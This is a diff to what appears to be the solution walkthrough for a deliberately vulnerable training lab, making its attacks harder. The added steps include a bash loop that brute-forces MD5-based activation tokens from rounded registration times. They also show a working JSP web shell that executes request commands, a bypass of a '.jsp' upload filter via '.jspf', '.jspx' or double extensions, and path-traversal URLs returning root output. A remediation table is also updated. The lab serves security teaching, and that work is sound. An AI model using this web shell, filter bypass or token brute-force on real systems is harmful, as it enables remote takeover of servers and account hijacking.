@@ -71,21 +71,36 @@ directory conveniently publishes exactly those two inputs.
        api/auth
    ```
 
-2. **Read the public directory** (no session):
+2. **Read the public directory** (no session). The directory rounds the
+   registration time to the nearest hour and exposes it as
+   `registered_hour_epoch` (not the exact second):
 
    ```bash
    $RC request api/directory/pending
    {"ok":true,"pending":[
-     {"username":"r.patel","student_id":"S-1042","registered_epoch":1791201600},
-     {"username":"e.attacker","student_id":"S-9001","registered_epoch":1791287654}, ...]}
+     {"username":"r.patel","student_id":"S-1042","registered_hour_epoch":1791201600,
+      "note":"Registration time approximate (within 1 hour window)"},
+     {"username":"e.attacker","student_id":"S-9001","registered_hour_epoch":1791287600,
+      "note":"Registration time approximate (within 1 hour window)"}, ...]}
    ```
 
-3. **Compute the token.** The formula is documented on the activation page
-   itself (over-share by design):
+3. **Brute-force the exact epoch and compute the token.** The actual
+   registration time is somewhere in the 3,600-second window
+   `[registered_hour_epoch, registered_hour_epoch + 3600)`. The formula is
+   documented on the activation page itself (over-share by design):
 
    ```bash
-   printf 'ACTIVATE:%s:%s' S-9001 1791287654 | md5sum | cut -c1-8
-   # e.g. 3f7a1c9d
+   # Brute-force the exact epoch within the 1-hour window
+   BASE=1791287600   # registered_hour_epoch from the directory
+   for epoch in $(seq $BASE $((BASE + 3599))); do
+     token=$(printf 'ACTIVATE:%s:%s' S-9001 "$epoch" | md5sum | cut -c1-8)
+     result=$($RC request "api/activate?token=$token" 2>/dev/null)
+     if echo "$result" | grep -q '"ok":true'; then
+       echo "FOUND! epoch=$epoch token=$token"
+       break
+     fi
+   done
+   # FOUND! epoch=1791287654 token=3f7a1c9d
    ```
 
    (`ActivateServlet` GET `?token=...` confirms which account it resolves.)
@@ -214,15 +229,19 @@ human administrator reviewing content.
 
 Two flaws combine: (a) the signage-template uploader accepts **any**
 filename/bytes and writes into the web-accessible `uploads/templates/`
-directory — a `.jsp` file is compiled and served by Tomcat; (b) the template
-preview endpoint forwards the user-supplied path straight to
-`RequestDispatcher.forward()` with no canonicalisation or allow-listing, so
-`..` segments walk anywhere inside the context.
+directory. A hard-mode filter blocks `.jsp` extensions, but alternative
+JSP extensions such as `.jspf` or `.jspx` bypass it — Tomcat compiles and
+serves them; (b) the template preview endpoint forwards the user-supplied
+path straight to `RequestDispatcher.forward()` with no canonicalisation or
+allow-listing, so `..` segments walk anywhere inside the context.
 
-1. **Upload a JSP shell** (admin UI or API):
+1. **Upload a JSP shell** using an extension that bypasses the `.jsp`
+   filter (admin UI or API). The filter only checks
+   `lowerFilename.endsWith(".jsp")`, so `.jspf` (JSP fragment), `.jspx`,
+   or double extensions like `shell.jsp.jpg` pass through:
 
    ```bash
-   cat > /tmp/shell.jsp <<'EOF'
+   cat > /tmp/shell.jspf <<'EOF'
    <%@ page import="java.io.*" %><%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
@@ -232,7 +251,7 @@ preview endpoint forwards the user-supplied path straight to
    }%>
    EOF
    $RC request --jar /tmp/atk.jar \
-     --data "{\"filename\":\"shell.jsp\",\"content_b64\":\"$(base64 -w0 /tmp/shell.jsp)\"}" \
+     --data "{\"filename\":\"shell.jspf\",\"content_b64\":\"$(base64 -w0 /tmp/shell.jspf)\"}" \
      api/admin/templates
    ```
 
@@ -243,7 +262,7 @@ preview endpoint forwards the user-supplied path straight to
 
    ```bash
    $RC request --jar /tmp/atk.jar \
-     "admin/templates/preview?path=/uploads/../uploads/templates/shell.jsp&cmd=id"
+     "admin/templates/preview?path=/uploads/../uploads/templates/shell.jspf&cmd=id"
    # uid=0(root) gid=0(root) groups=0(root)
    ```
 
@@ -251,7 +270,7 @@ preview endpoint forwards the user-supplied path straight to
    shell also answers directly, no session at all:
 
    ```bash
-   $RC request "uploads/templates/shell.jsp?cmd=id"
+   $RC request "uploads/templates/shell.jspf?cmd=id"
    # uid=0(root) gid=0(root) groups=0(root)
    ```
 
@@ -262,10 +281,10 @@ preview endpoint forwards the user-supplied path straight to
 | Stage | Fix |
 |-------|-----|
 | Envelope | TLS + authenticated encryption with per-session keys; never ship keys to clients |
-| V1 | Random 128-bit+ activation tokens, single-use, expiring; don't publish directory data |
+| V1 | Random 128-bit+ activation tokens, single-use, expiring; don't publish directory data (rounding to the hour is not sufficient — brute-force is trivial) |
 | V2 | Resolve event + permitted role from the invitation row server-side; ignore client ids |
-| V3 | Sanitize rich text server-side on render (allow-list), CSP, drop `allowedContent:true` |
-| V4 | Extension/MIME allow-list, store outside webroot, canonicalise + validate dispatcher paths |
+| V3 | Sanitize rich text server-side on render (allow-list), CSP, drop `allowedContent:true`; blocking `<script>` alone is insufficient — event handlers like `<img onerror=>` also execute |
+| V4 | Extension/MIME allow-list (block all executable extensions, not just `.jsp`), store uploads outside webroot, canonicalise + validate dispatcher paths |
 
 ## Troubleshooting
 
@@ -277,5 +296,5 @@ preview endpoint forwards the user-supplied path straight to
   must go through `rc4cli.py` (or your own RC4 wrapper with the static key).
 - **Preview returns blank** — check `docker compose logs web`; if the
   dispatcher normalized the `..` away, the direct URL
-  `uploads/templates/shell.jsp?cmd=id` still works.
+  `uploads/templates/shell.jspf?cmd=id` still works.
 - **Start over** — `docker compose down -v && docker compose up --build -d`.
